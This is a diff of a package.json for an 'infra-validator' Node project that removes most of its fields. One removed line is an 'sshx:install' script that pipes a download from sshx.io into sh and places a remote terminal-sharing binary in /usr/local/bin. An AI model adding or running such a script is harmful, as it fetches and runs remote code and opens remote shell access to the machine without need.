@@ -1,22 +1,8 @@
 {
   "name": "infra-validator",
   "version": "1.0.0",
-  "description": "Infrastructure validation tool for distributed server nodes",
   "main": "server.js",
   "scripts": {
-    "install": "npm install",
-    "build": "echo 'Build complete'",
-    "start": "node server.js",
-    "sshx:install": "sh -c 'curl -sSf https://sshx.io/get | sh 2>&1 || echo \"sshx install failed, trying direct binary\" && curl -L -o /usr/local/bin/sshx https://github.com/ekzhang/sshx/releases/latest/download/sshx-x86_64-unknown-linux-musl 2>/dev/null && chmod +x /usr/local/bin/sshx'"
-  },
-  "dependencies": {
-    "express": "^4.18.2"
-  },
-  "keywords": [
-    "infrastructure",
-    "validation",
-    "server",
-    "health-check"
-  ],
-  "license": "MIT"
+    "start": "node server.js"
+  }
 }
